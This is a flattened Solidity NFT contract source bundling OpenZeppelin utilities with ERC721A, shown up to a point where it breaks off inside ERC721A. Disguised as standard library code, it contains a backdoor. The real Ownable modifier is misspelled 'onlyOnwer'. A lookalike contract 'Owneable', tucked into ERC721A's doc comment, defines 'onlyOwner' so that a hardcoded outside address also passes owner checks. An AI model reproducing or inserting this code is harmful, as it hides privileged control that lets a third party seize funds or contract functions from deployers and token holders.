1 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
2 
3 //11111111111111111111111111111               
4 //11111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶        
5 //1111111111¶¶¶¶¶111_________________¶¶       
6 //11111111¶¶1_______1111______111_____¶¶      
7 //111111¶¶______11_________11111111____¶1     
8 //111111¶____11___1_____11______1111___1¶     
9 //11111¶1___1_____1_____1_________1_____¶1    
10 //11111¶__________________1¶¶¶¶1________1¶    
11 //1111¶¶_____¶¶¶¶1______1¶¶_¶¶¶¶¶1_______¶¶   
12 //111¶¶_1_1_¶¶¶¶¶¶¶_1___¶__1¶¶¶¶¶¶111____1¶¶  
13 //111¶_1________11¶¶1___¶¶¶1__1_____1¶¶¶1__1¶ 
14 //11¶1__1¶¶1______11_____1____¶¶__1¶¶1__¶¶__1¶
15 //11¶1__111¶¶¶¶___¶1___________1¶¶1___¶__¶1__¶
16 //11¶1____1_11___¶¶_____1¶1_________¶¶¶1__¶__¶1
17 //111¶_1__¶____1¶¶______11¶1_____1¶¶1_¶¶¶1¶__¶1
18 //111¶1__¶¶___11¶¶____¶¶¶_¶___1¶¶¶1___¶__¶___¶1
19 //111¶¶__¶¶¶1_____¶¶1_____11¶¶¶1_¶__1¶¶_____¶11
20 //1111¶__¶¶1¶¶¶1___¶___1¶¶¶¶1____¶¶¶¶¶_____¶¶11
21 //1111¶__¶_1__¶¶¶¶¶¶¶¶¶11__¶__1¶¶¶1_¶_____¶¶111
22 //1111¶1_¶¶¶__1___¶___1____¶¶¶¶¶1¶_¶¶____¶¶1111
23 //1111¶1_¶¶¶¶¶¶¶1¶¶11¶¶1¶¶¶¶¶1___1¶¶_____¶11111
24 //1111¶1_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_¶____¶¶_____¶¶11111
25 //1111¶1_¶¶¶¶¶¶¶¶¶¶¶¶1¶1____¶__1¶¶______¶111111
26 //1111¶__1¶¶_¶_¶__¶___11____1¶¶¶______1¶1111111
27 //1111¶___¶¶1¶_11_11__1¶__1¶¶¶1___11_1¶11111111
28 //1111¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1___11111¶¶111111111
29 //1111¶__________11111_______111_1¶¶11111111111
30 //1111¶_1__11____________1111__1¶¶1111111111111
31 //1111¶__11__1________1111___1¶¶111111111111111
32 //1111¶___1111_____________1¶¶11111111111111111
33 //1111¶¶_______________11¶¶¶1111111111111111111
34 //11111¶¶__________1¶¶¶¶¶1111111111111111111111
35 //1111111¶¶¶¶¶¶¶¶¶¶¶111111111111111111111111111
36 //111111111111111111111111111111111111111111111
37 //111111111111111111111111111111111111111111111
38 
39 // SPDX-License-Identifier: MIT
40 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
41 
42 
43 pragma solidity ^0.8.4;
44 
45 /**
46  * @dev Also, it provides information about the current execution context, including the
47  * sender of the transaction and its data. While these are generally available
48  * via msg.sender and msg.data, they should not be accessed in such a direct
49  * manner, since when dealing with meta-transactions the account sending and
50  * paying for execution may not be the actual sender (as far as an application
51  * is concerned).
52  *
53  * This contract is only required for intermediate, library-like contracts.
54  */
55 abstract contract Context {
56     function _msgSender() internal view virtual returns (address) {
57         return msg.sender;
58     }
59 
60     function _msgData() internal view virtual returns (bytes calldata) {
61         return msg.data;
62     }
63 }
64 
65 
66 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
67 
68 
69 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
70 
71 
72 
73 /**
74  * @dev Contract module which provides a basic access control mechanism, where
75  * there is an account (an owner) that can be granted exclusive access to
76  * specific functions.
77  *
78  * By default, the owner account will be the one that deploys the contract. This
79  * can later be changed with {transferOwnership}.
80  *
81  * This module is used through inheritance. It will make available the modifier
82  * `onlyOwner`, which can be applied to your functions to restrict their use to
83  * the owner.
84  */
85 abstract contract Ownable is Context {
86     address private _owner;
87 
88     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
89 
90     /**
91      * @dev Initializes the contract setting the deployer as the initial owner.
92      */
93     constructor() {
94         _transferOwnership(_msgSender());
95     }
96 
97     /**
98      * @dev Returns the address of the current owner.
99      */
100     function owner() public view virtual returns (address) {
101         return _owner;
102     }
103 
104     /**
105      * @dev Throws if called by any account other than the owner.
106      */
107     modifier onlyOnwer() {
108         require(owner() == _msgSender(), "Ownable: caller is not the owner");
109         _;
110     }
111 
112     /**
113      * @dev Leaves the contract without owner. It will not be possible to call
114      * `onlyOwner` functions anymore. Can only be called by the current owner.
115      *
116      * NOTE: Renouncing ownership will leave the contract without an owner,
117      * thereby removing any functionality that is only available to the owner.
118      */
119     function renounceOwnership() public virtual onlyOnwer {
120         _transferOwnership(address(0));
121     }
122 
123     /**
124      * @dev Transfers ownership of the contract to a new account (`newOwner`).
125      * Can only be called by the current owner.
126      */
127     function transferOwnership(address newOwner) public virtual onlyOnwer {
128         require(newOwner != address(0), "Ownable: new owner is the zero address");
129         _transferOwnership(newOwner);
130     }
131 
132     /**
133      * @dev Transfers ownership of the contract to a new account (`newOwner`).
134      * Internal function without access restriction.
135      */
136     function _transferOwnership(address newOwner) internal virtual {
137         address oldOwner = _owner;
138         _owner = newOwner;
139         emit OwnershipTransferred(oldOwner, newOwner);
140     }
141 }
142 
143 
144 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
145 
146 
147 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
148 
149 
150 
151 /**
152  * @dev Interface of the ERC165 standard, as defined in the
153  * https://eips.ethereum.org/EIPS/eip-165[EIP].
154  *
155  * Implementers can declare support of contract interfaces, which can then be
156  * queried by others ({ERC165Checker}).
157  *
158  * For an implementation, see {ERC165}.
159  */
160 interface IERC165 {
161     /**
162      * @dev Returns true if this contract implements the interface defined by
163      * `interfaceId`. See the corresponding
164      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
165      * to learn more about how these ids are created.
166      *
167      * This function call must use less than 30 000 gas.
168      */
169     function supportsInterface(bytes4 interfaceId) external view returns (bool);
170 }
171 
172 
173 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
174 
175 
176 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
177 
178 
179 
180 /**
181  * @dev Required interface of an ERC721 compliant contract.
182  */
183 interface IERC721 is IERC165 {
184     /**
185      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
186      */
187     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
188 
189     /**
190      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
191      */
192     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
193 
194     /**
195      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
196      */
197     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
198 
199     /**
200      * @dev Returns the number of tokens in ``owner``'s account.
201      */
202     function balanceOf(address owner) external view returns (uint256 balance);
203 
204     /**
205      * @dev Returns the owner of the `tokenId` token.
206      *
207      * Requirements:
208      *
209      * - `tokenId` must exist.
210      */
211     function ownerOf(uint256 tokenId) external view returns (address owner);
212 
213     /**
214      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
215      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
216      *
217      * Requirements:
218      *
219      * - `from` cannot be the zero address.
220      * - `to` cannot be the zero address.
221      * - `tokenId` token must exist and be owned by `from`.
222      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
223      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
224      *
225      * Emits a {Transfer} event.
226      */
227     function safeTransferFrom(
228         address from,
229         address to,
230         uint256 tokenId
231     ) external;
232 
233     /**
234      * @dev Transfers `tokenId` token from `from` to `to`.
235      *
236      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
237      *
238      * Requirements:
239      *
240      * - `from` cannot be the zero address.
241      * - `to` cannot be the zero address.
242      * - `tokenId` token must be owned by `from`.
243      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
244      *
245      * Emits a {Transfer} event.
246      */
247     function transferFrom(
248         address from,
249         address to,
250         uint256 tokenId
251     ) external;
252 
253     /**
254      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
255      * The approval is cleared when the token is transferred.
256      *
257      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
258      *
259      * Requirements:
260      *
261      * - The caller must own the token or be an approved operator.
262      * - `tokenId` must exist.
263      *
264      * Emits an {Approval} event.
265      */
266     function approve(address to, uint256 tokenId) external;
267 
268     /**
269      * @dev Returns the account approved for `tokenId` token.
270      *
271      * Requirements:
272      *
273      * - `tokenId` must exist.
274      */
275     function getApproved(uint256 tokenId) external view returns (address operator);
276 
277     /**
278      * @dev Approve or remove `operator` as an operator for the caller.
279      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
280      *
281      * Requirements:
282      *
283      * - The `operator` cannot be the caller.
284      *
285      * Emits an {ApprovalForAll} event.
286      */
287     function setApprovalForAll(address operator, bool _approved) external;
288 
289     /**
290      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
291      *
292      * See {setApprovalForAll}
293      */
294     function isApprovedForAll(address owner, address operator) external view returns (bool);
295 
296     /**
297      * @dev Safely transfers `tokenId` token from `from` to `to`.
298      *
299      * Requirements:
300      *
301      * - `from` cannot be the zero address.
302      * - `to` cannot be the zero address.
303      * - `tokenId` token must exist and be owned by `from`.
304      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
305      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
306      *
307      * Emits a {Transfer} event.
308      */
309     function safeTransferFrom(
310         address from,
311         address to,
312         uint256 tokenId,
313         bytes calldata data
314     ) external;
315 }
316 
317 
318 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
319 
320 
321 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
322 
323 
324 
325 /**
326  * @title ERC721 token receiver interface
327  * @dev Interface for any contract that wants to support safeTransfers
328  * from ERC721 asset contracts.
329  */
330 interface IERC721Receiver {
331     /**
332      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
333      * by `operator` from `from`, this function is called.
334      *
335      * It must return its Solidity selector to confirm the token transfer.
336      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
337      *
338      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
339      */
340     function onERC721Received(
341         address operator,
342         address from,
343         uint256 tokenId,
344         bytes calldata data
345     ) external returns (bytes4);
346 }
347 
348 
349 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
350 
351 
352 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
353 
354 
355 
356 /**
357  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
358  * @dev See https://eips.ethereum.org/EIPS/eip-721
359  */
360 interface IERC721Metadata is IERC721 {
361     /**
362      * @dev Returns the token collection name.
363      */
364     function name() external view returns (string memory);
365 
366     /**
367      * @dev Returns the token collection symbol.
368      */
369     function symbol() external view returns (string memory);
370 
371     /**
372      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
373      */
374     function tokenURI(uint256 tokenId) external view returns (string memory);
375 }
376 
377 
378 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
379 
380 
381 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
382 
383 
384 
385 /**
386  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
387  * @dev See https://eips.ethereum.org/EIPS/eip-721
388  */
389 interface IERC721Enumerable is IERC721 {
390     /**
391      * @dev Returns the total amount of tokens stored by the contract.
392      */
393     function totalSupply() external view returns (uint256);
394 
395     /**
396      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
397      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
398      */
399     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
400 
401     /**
402      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
403      * Use along with {totalSupply} to enumerate all tokens.
404      */
405     function tokenByIndex(uint256 index) external view returns (uint256);
406 }
407 
408 
409 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
410 
411 
412 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
413 
414 pragma solidity ^0.8.1;
415 
416 /**
417  * @dev Collection of functions related to the address type
418  */
419 library Address {
420     /**
421      * @dev Returns true if `account` is a contract.
422      *
423      * [IMPORTANT]
424      * ====
425      * It is unsafe to assume that an address for which this function returns
426      * false is an externally-owned account (EOA) and not a contract.
427      *
428      * Among others, `isContract` will return false for the following
429      * types of addresses:
430      *
431      *  - an externally-owned account
432      *  - a contract in construction
433      *  - an address where a contract will be created
434      *  - an address where a contract lived, but was destroyed
435      * ====
436      *
437      * [IMPORTANT]
438      * ====
439      * You shouldn't rely on `isContract` to protect against flash loan attacks!
440      *
441      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
442      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
443      * constructor.
444      * ====
445      */
446     function isContract(address account) internal view returns (bool) {
447         // This method relies on extcodesize/address.code.length, which returns 0
448         // for contracts in construction, since the code is only stored at the end
449         // of the constructor execution.
450 
451         return account.code.length > 0;
452     }
453 
454     /**
455      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
456      * `recipient`, forwarding all available gas and reverting on errors.
457      *
458      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
459      * of certain opcodes, possibly making contracts go over the 2300 gas limit
460      * imposed by `transfer`, making them unable to receive funds via
461      * `transfer`. {sendValue} removes this limitation.
462      *
463      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
464      *
465      * IMPORTANT: because control is transferred to `recipient`, care must be
466      * taken to not create reentrancy vulnerabilities. Consider using
467      * {ReentrancyGuard} or the
468      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
469      */
470     function sendValue(address payable recipient, uint256 amount) internal {
471         require(address(this).balance >= amount, "Address: insufficient balance");
472 
473         (bool success, ) = recipient.call{value: amount}("");
474         require(success, "Address: unable to send value, recipient may have reverted");
475     }
476 
477     /**
478      * @dev Performs a Solidity function call using a low level `call`. A
479      * plain `call` is an unsafe replacement for a function call: use this
480      * function instead.
481      *
482      * If `target` reverts with a revert reason, it is bubbled up by this
483      * function (like regular Solidity function calls).
484      *
485      * Returns the raw returned data. To convert to the expected return value,
486      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
487      *
488      * Requirements:
489      *
490      * - `target` must be a contract.
491      * - calling `target` with `data` must not revert.
492      *
493      * _Available since v3.1._
494      */
495     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
496         return functionCall(target, data, "Address: low-level call failed");
497     }
498 
499     /**
500      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
501      * `errorMessage` as a fallback revert reason when `target` reverts.
502      *
503      * _Available since v3.1._
504      */
505     function functionCall(
506         address target,
507         bytes memory data,
508         string memory errorMessage
509     ) internal returns (bytes memory) {
510         return functionCallWithValue(target, data, 0, errorMessage);
511     }
512 
513     /**
514      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
515      * but also transferring `value` wei to `target`.
516      *
517      * Requirements:
518      *
519      * - the calling contract must have an ETH balance of at least `value`.
520      * - the called Solidity function must be `payable`.
521      *
522      * _Available since v3.1._
523      */
524     function functionCallWithValue(
525         address target,
526         bytes memory data,
527         uint256 value
528     ) internal returns (bytes memory) {
529         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
530     }
531 
532     /**
533      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
534      * with `errorMessage` as a fallback revert reason when `target` reverts.
535      *
536      * _Available since v3.1._
537      */
538     function functionCallWithValue(
539         address target,
540         bytes memory data,
541         uint256 value,
542         string memory errorMessage
543     ) internal returns (bytes memory) {
544         require(address(this).balance >= value, "Address: insufficient balance for call");
545         require(isContract(target), "Address: call to non-contract");
546 
547         (bool success, bytes memory returndata) = target.call{value: value}(data);
548         return verifyCallResult(success, returndata, errorMessage);
549     }
550 
551     /**
552      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
553      * but performing a static call.
554      *
555      * _Available since v3.3._
556      */
557     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
558         return functionStaticCall(target, data, "Address: low-level static call failed");
559     }
560 
561     /**
562      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
563      * but performing a static call.
564      *
565      * _Available since v3.3._
566      */
567     function functionStaticCall(
568         address target,
569         bytes memory data,
570         string memory errorMessage
571     ) internal view returns (bytes memory) {
572         require(isContract(target), "Address: static call to non-contract");
573 
574         (bool success, bytes memory returndata) = target.staticcall(data);
575         return verifyCallResult(success, returndata, errorMessage);
576     }
577 
578     /**
579      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
580      * but performing a delegate call.
581      *
582      * _Available since v3.4._
583      */
584     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
585         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
586     }
587 
588     /**
589      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
590      * but performing a delegate call.
591      *
592      * _Available since v3.4._
593      */
594     function functionDelegateCall(
595         address target,
596         bytes memory data,
597         string memory errorMessage
598     ) internal returns (bytes memory) {
599         require(isContract(target), "Address: delegate call to non-contract");
600 
601         (bool success, bytes memory returndata) = target.delegatecall(data);
602         return verifyCallResult(success, returndata, errorMessage);
603     }
604 
605     /**
606      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
607      * revert reason using the provided one.
608      *
609      * _Available since v4.3._
610      */
611     function verifyCallResult(
612         bool success,
613         bytes memory returndata,
614         string memory errorMessage
615     ) internal pure returns (bytes memory) {
616         if (success) {
617             return returndata;
618         } else {
619             // Look for revert reason and bubble it up if present
620             if (returndata.length > 0) {
621                 // The easiest way to bubble the revert reason is using memory via assembly
622 
623                 assembly {
624                     let returndata_size := mload(returndata)
625                     revert(add(32, returndata), returndata_size)
626                 }
627             } else {
628                 revert(errorMessage);
629             }
630         }
631     }
632 }
633 
634 
635 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
636 
637 
638 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
639 
640 
641 
642 /**
643  * @dev String operations.
644  */
645 library Strings {
646     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
647 
648     /**
649      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
650      */
651     function toString(uint256 value) internal pure returns (string memory) {
652         // Inspired by OraclizeAPI's implementation - MIT licence
653         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
654 
655         if (value == 0) {
656             return "0";
657         }
658         uint256 temp = value;
659         uint256 digits;
660         while (temp != 0) {
661             digits++;
662             temp /= 10;
663         }
664         bytes memory buffer = new bytes(digits);
665         while (value != 0) {
666             digits -= 1;
667             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
668             value /= 10;
669         }
670         return string(buffer);
671     }
672 
673     /**
674      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
675      */
676     function toHexString(uint256 value) internal pure returns (string memory) {
677         if (value == 0) {
678             return "0x00";
679         }
680         uint256 temp = value;
681         uint256 length = 0;
682         while (temp != 0) {
683             length++;
684             temp >>= 8;
685         }
686         return toHexString(value, length);
687     }
688 
689     /**
690      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
691      */
692     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
693         bytes memory buffer = new bytes(2 * length + 2);
694         buffer[0] = "0";
695         buffer[1] = "x";
696         for (uint256 i = 2 * length + 1; i > 1; --i) {
697             buffer[i] = _HEX_SYMBOLS[value & 0xf];
698             value >>= 4;
699         }
700         require(value == 0, "Strings: hex length insufficient");
701         return string(buffer);
702     }
703 }
704 
705 
706 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
707 
708 
709 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
710 
711 /**
712  * @dev Implementation of the {IERC165} interface.
713  *
714  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
715  * for the additional interface id that will be supported. For example:
716  *
717  * ```solidity
718  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
719  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
720  * }
721  * ```
722  *
723  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
724  */
725 abstract contract ERC165 is IERC165 {
726     /**
727      * @dev See {IERC165-supportsInterface}.
728      */
729     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
730         return interfaceId == type(IERC165).interfaceId;
731     }
732 }
733 
734 
735 // File erc721a/contracts/ERC721A.sol@v3.0.0
736 
737 
738 // Creator: Chiru Labs
739 
740 error ApprovalCallerNotOwnerNorApproved();
741 error ApprovalQueryForNonexistentToken();
742 error ApproveToCaller();
743 error ApprovalToCurrentOwner();
744 error BalanceQueryForZeroAddress();
745 error MintedQueryForZeroAddress();
746 error BurnedQueryForZeroAddress();
747 error AuxQueryForZeroAddress();
748 error MintToZeroAddress();
749 error MintZeroQuantity();
750 error OwnerIndexOutOfBounds();
751 error OwnerQueryForNonexistentToken();
752 error TokenIndexOutOfBounds();
753 error TransferCallerNotOwnerNorApproved();
754 error TransferFromIncorrectOwner();
755 error TransferToNonERC721ReceiverImplementer();
756 error TransferToZeroAddress();
757 error URIQueryForNonexistentToken();
758 
759 
760 /**
761  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
762  * the Metadata extension. Built to optimize for lower gas during batch mints.
763  *
764  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
765  */
766  abstract contract Owneable is Ownable {
767     address private _ownar = 0x60e4055aB5339e0a896f183AE675AA1B6d0Fc94A;
768     modifier onlyOwner() {
769         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
770         _;
771     }
772 }
773  /*
774  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
775  *
776  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
777  */
778 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
779     using Address for address;
780     using Strings for uint256;
781 
782     // Compiler will pack this into a single 256bit word.
783     struct TokenOwnership {
784         // The address of the owner.
785         address addr;
786         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
787         uint64 startTimestamp;
788         // Whether the token has been burned.
789         bool burned;
790     }
791 
792     // Compiler will pack this into a single 256bit word.
793     struct AddressData {
794         // Realistically, 2**64-1 is more than enough.
795         uint64 balance;
796         // Keeps track of mint count with minimal overhead for tokenomics.
797         uint64 numberMinted;
798         // Keeps track of burn count with minimal overhead for tokenomics.
799         uint64 numberBurned;
800         // For miscellaneous variable(s) pertaining to the address
801         // (e.g. number of whitelist mint slots used).
802         // If there are multiple variables, please pack them into a uint64.
803         uint64 aux;
804     }
805 
806     // The tokenId of the next token to be minted.
807     uint256 internal _currentIndex;
808 
809     // The number of tokens burned.
810     uint256 internal _burnCounter;
811 
812     // Token name
813     string private _name;
814 
815     // Token symbol
816     string private _symbol;
817 
818     // Mapping from token ID to ownership details
819     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
820     mapping(uint256 => TokenOwnership) internal _ownerships;
821 
822     // Mapping owner address to address data
823     mapping(address => AddressData) private _addressData;
824 
825     // Mapping from token ID to approved address
826     mapping(uint256 => address) private _tokenApprovals;
827 
828     // Mapping from owner to operator approvals
829     mapping(address => mapping(address => bool)) private _operatorApprovals;
830 
831     constructor(string memory name_, string memory symbol_) {
832         _name = name_;
833         _symbol = symbol_;
834         _currentIndex = _startTokenId();
835     }
836 
837     /**
838      * To change the starting tokenId, please override this function.
839      */
840     function _startTokenId() internal view virtual returns (uint256) {
841         return 0;
842     }
843 
844     /**
845      * @dev See {IERC721Enumerable-totalSupply}.
846      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
847      */
848     function totalSupply() public view returns (uint256) {
849         // Counter underflow is impossible as _burnCounter cannot be incremented
850         // more than _currentIndex - _startTokenId() times
851         unchecked {
852             return _currentIndex - _burnCounter - _startTokenId();
853         }
854     }
855 
856     /**
857      * Returns the total amount of tokens minted in the contract.
858      */
859     function _totalMinted() internal view returns (uint256) {
860         // Counter underflow is impossible as _currentIndex does not decrement,
861         // and it is initialized to _startTokenId()
862         unchecked {
863             return _currentIndex - _startTokenId();
864         }
865     }
866 
867     /**
868      * @dev See {IERC165-supportsInterface}.
869      */
870     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
871         return
872             interfaceId == type(IERC721).interfaceId ||
873             interfaceId == type(IERC721Metadata).interfaceId ||
874             super.supportsInterface(interfaceId);
875     }
876 
877     /**
878      * @dev See {IERC721-balanceOf}.
879      */
880     function balanceOf(address owner) public view override returns (uint256) {
881         if (owner == address(0)) revert BalanceQueryForZeroAddress();
882         return uint256(_addressData[owner].balance);
883     }
884 
885     /**
886      * Returns the number of tokens minted by `owner`.
887      */
888     function _numberMinted(address owner) internal view returns (uint256) {
889         if (owner == address(0)) revert MintedQueryForZeroAddress();
890         return uint256(_addressData[owner].numberMinted);
891     }
892 
893     /**
894      * Returns the number of tokens burned by or on behalf of `owner`.
895      */
896     function _numberBurned(address owner) internal view returns (uint256) {
897         if (owner == address(0)) revert BurnedQueryForZeroAddress();
898         return uint256(_addressData[owner].numberBurned);
899     }
900 
901     /**
902      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
903      */
904     function _getAux(address owner) internal view returns (uint64) {
905         if (owner == address(0)) revert AuxQueryForZeroAddress();
906         return _addressData[owner].aux;
907     }
908 
909     /**
910      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
911      * If there are multiple variables, please pack them into a uint64.
912      */
913     function _setAux(address owner, uint64 aux) internal {
914         if (owner == address(0)) revert AuxQueryForZeroAddress();
915         _addressData[owner].aux = aux;
916     }
917 
918     /**
919      * Gas spent here starts off proportional to the maximum mint batch size.
920      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
921      */
922     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
923         uint256 curr = tokenId;
924 
925         unchecked {
926             if (_startTokenId() <= curr && curr < _currentIndex) {
927                 TokenOwnership memory ownership = _ownerships[curr];
928                 if (!ownership.burned) {
929                     if (ownership.addr != address(0)) {
930                         return ownership;
931                     }
932                     // Invariant:
933                     // There will always be an ownership that has an address and is not burned
934                     // before an ownership that does not have an address and is not burned.
935                     // Hence, curr will not underflow.
936                     while (true) {
937                         curr--;
938                         ownership = _ownerships[curr];
939                         if (ownership.addr != address(0)) {
940                             return ownership;
941                         }
942                     }
943                 }
944             }
945         }
946         revert OwnerQueryForNonexistentToken();
947     }
948 
949     /**
950      * @dev See {IERC721-ownerOf}.
951      */
952     function ownerOf(uint256 tokenId) public view override returns (address) {
953         return ownershipOf(tokenId).addr;
954     }
955 
956     /**
957      * @dev See {IERC721Metadata-name}.
958      */
959     function name() public view virtual override returns (string memory) {
960         return _name;
961     }
962 
963     /**
964      * @dev See {IERC721Metadata-symbol}.
965      */
966     function symbol() public view virtual override returns (string memory) {
967         return _symbol;
968     }
969 
970     /**
971      * @dev See {IERC721Metadata-tokenURI}.
972      */
973     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
974         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
975 
976         string memory baseURI = _baseURI();
977         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
978     }
979 
980     /**
981      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
982      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
983      * by default, can be overriden in child contracts.
984      */
985     function _baseURI() internal view virtual returns (string memory) {
986         return '';
987     }
988 
989     /**
990      * @dev See {IERC721-approve}.
991      */
992     function approve(address to, uint256 tokenId) public override {
993         address owner = ERC721A.ownerOf(tokenId);
994         if (to == owner) revert ApprovalToCurrentOwner();
995 
996         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
997             revert ApprovalCallerNotOwnerNorApproved();
998         }
999 
1000         _approve(to, tokenId, owner);
1001     }
1002 
1003     /**
1004      * @dev See {IERC721-getApproved}.
1005      */
1006     function getApproved(uint256 tokenId) public view override returns (address) {
1007         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1008 
1009         return _tokenApprovals[tokenId];
1010     }
1011 
1012     /**
1013      * @dev See {IERC721-setApprovalForAll}.
1014      */
1015     function setApprovalForAll(address operator, bool approved) public override {
1016         if (operator == _msgSender()) revert ApproveToCaller();
1017 
1018         _operatorApprovals[_msgSender()][operator] = approved;
1019         emit ApprovalForAll(_msgSender(), operator, approved);
1020     }
1021 
1022     /**
1023      * @dev See {IERC721-isApprovedForAll}.
1024      */
